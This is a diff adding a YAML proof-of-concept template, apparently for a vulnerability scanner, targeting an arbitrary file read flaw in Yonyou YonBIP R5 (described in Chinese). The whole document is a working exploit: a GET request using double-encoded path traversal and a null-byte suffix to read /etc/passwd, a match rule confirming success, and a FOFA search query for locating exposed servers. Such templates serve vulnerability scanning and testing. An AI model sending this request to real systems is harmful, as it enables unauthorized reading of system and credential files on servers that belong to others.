@@ -1,0 +1,15 @@
+id: poc-yaml-yonyou-yonbip-yonbiplogin-anyfile-read
+info:
+  name: 用友YonBIP R5旗舰版 yonbiplogin 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友YonBIP
+  fofa: title="数字化工作台" || title="YonBIP"
+requests:
+- method: GET
+  path: /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(headers,"yonbiplogin")
+variables: {}
+transport: http
